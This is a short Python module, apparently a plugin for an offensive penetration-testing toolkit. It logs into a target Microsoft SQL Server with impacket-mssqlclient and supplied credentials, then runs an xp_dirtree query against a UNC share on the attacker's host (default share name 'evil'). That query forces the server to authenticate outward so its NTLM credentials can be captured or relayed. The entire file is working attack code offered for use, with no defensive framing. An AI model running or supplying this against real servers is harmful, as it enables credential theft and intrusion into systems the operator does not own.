from core.attacker import resolve_lhost
import subprocess

def run(data, cred, args):
    ip = data.get("ip")
    lhost = resolve_lhost(args)
    share = getattr(args, "share", None) or "evil"

    if not ip or not lhost:
        print("[!] Missing target IP or lhost")
        return

    if not cred:
        print("[!] Credentials required")
        return

    user = cred.get("user")
    password = cred.get("secret")

    query = f"EXEC master..xp_dirtree '\\\\{lhost}\\{share}', 1, 1"

    print(f"[*] Triggering forced authentication to \\\\{lhost}\\{share}")

    try:
        proc = subprocess.Popen(
        ["impacket-mssqlclient", f"{user}:{password}@{ip}"],
        stdin=subprocess.PIPE,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        text=True
    )

        proc.communicate(query + "\nexit\n")
        
    except KeyboardInterrupt:
        print("\n[*] Interrupted.")